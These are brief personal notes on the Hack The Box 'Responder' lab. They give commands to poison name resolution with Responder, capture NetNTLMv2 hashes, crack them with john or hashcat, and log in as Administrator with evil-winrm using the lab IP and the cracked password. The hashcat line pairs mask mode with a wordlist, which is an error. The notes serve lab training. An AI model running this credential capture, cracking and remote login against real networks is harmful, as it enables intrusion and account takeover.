## Notes from responder box in HTB

Run responder 
```
sudo responder -I tun0 -w -d
```

Get the hash, save it and try the hash with john or hashcat (/ optional: --format=netntlmv2, or wordlist as rockyou.txt)

john usage
```
john hash.txt 
```

hashcat usage
```
hashcat -m 5600 -a 3 hash.txt useful/rockyou.txt
```
connect with evil winrm (if for example port 5985 is open!)

```
evil-winrm -i 10.129.112.59 -u Administrator -p badminton
```
